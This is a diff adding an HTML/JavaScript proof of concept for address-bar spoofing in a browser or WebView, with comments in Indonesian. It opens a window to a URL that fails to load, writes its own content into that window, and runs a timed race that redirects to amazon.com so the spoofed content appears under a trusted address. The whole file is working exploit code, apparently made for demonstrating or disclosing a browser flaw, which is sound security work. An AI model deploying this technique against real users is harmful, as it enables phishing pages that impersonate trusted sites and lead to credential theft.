@@ -1,0 +1,42 @@
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+  <a href="#" onclick="startSpoof()">Spoof</a>
+</body>
+
+<script>
+let win;
+
+function spoofContent() {
+  try {
+    // mencoba akses akan error ketika origin mismatch
+    void win.location;
+  } catch (e) {
+    // ini lebih clean dibanding href=...
+    win.location.replace("https://www.amazon.com/");
+  }
+}
+
+function startSpoof() {
+
+  // buka window ke domain yang pasti gagal load dengan cepat
+  win = window.open("https://google.com:82", "_blank");
+
+  // overwrite konten lebih cepat sebelum WebView ngereact
+  win.document.open();
+  win.document.write(`
+    <h2 style="font-family: sans-serif; padding:20px;">
+      Address bar telah di-spoof.<br>
+      Ini bukan <b>amazon.com</b>.
+    </h2>
+  `);
+  win.document.close();
+
+  // jalankan race yang lebih “halus” dengan microtask
+  const race = () => spoofContent();
+  setInterval(race, 1);
+
+}
+</script>
